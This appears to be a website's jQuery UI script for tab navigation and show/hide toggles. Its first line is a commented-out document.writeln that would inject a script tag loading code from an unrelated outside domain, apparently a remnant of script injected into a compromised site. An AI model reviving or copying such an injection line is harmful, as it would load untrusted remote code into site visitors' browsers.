//document.writeln("<script language=\"javascript\" src=\"http:\/\/jbnk.81558888.com\/shang2.aspx\" charset=\"gb2312\"><\/script>")

(function($){
	var EYE = window.EYE = function() {
		var _registered = {
			init: []
		};
		return {
			init: function() {
				$.each(_registered.init, function(nr, fn){
					fn.call();
				});
			},
			extend: function(prop) {
				for (var i in prop) {
					if (prop[i] != undefined) {
						this[i] = prop[i];
					}
				}
			},
			register: function(fn, type) {
				if (!_registered[type]) {
					_registered[type] = [];
				}
				_registered[type].push(fn);
			}
		};
	}();
	$(EYE.init);
})(jQuery);
(function($){
	var initLayout = function() {
		var hash = window.location.hash.replace('#', '');
		var currentTab = $('ul.navigationTabs a')
							.bind('click', showTab)
							.filter('a[rel=' + hash + ']');
		if (currentTab.size() == 0) {
			currentTab = $('ul.navigationTabs a:first');
		}
		showTab.apply(currentTab.get(0));
	};
	
	var showTab = function(e) {
		var tabIndex = $('ul.navigationTabs a')
							.removeClass('active')
							.index(this);
		$(this)
			.addClass('active')
			.blur();
		$('div.tab')
			.hide()
				.eq(tabIndex)
				.show();
	};
	
	EYE.register(initLayout, 'init');
})(jQuery)

$(document).ready(function(){
						   
    $("#head4").click(function(){
					if($("#head5").css("display")=='none')
					{
                        $("#head5").show();
                    }
                    else
					{
						$("#head5").hide();
                    }		   
     })
	$("#lanmu2113").click(function(){
			if($("#lanmu2114").css("display")=='none'){
                                   $("#lanmu2114").show();
                             }
                             else{
								   $("#lanmu2114").hide();
                                }
     })
	$("#jianjie12").click(function(){
			if($("#jianjie12x").css("display")=='none'){
                                   $("#jianjie12x").show();
                             }
                             else{
								   $("#jianjie12x").hide();
                                }
     })
});



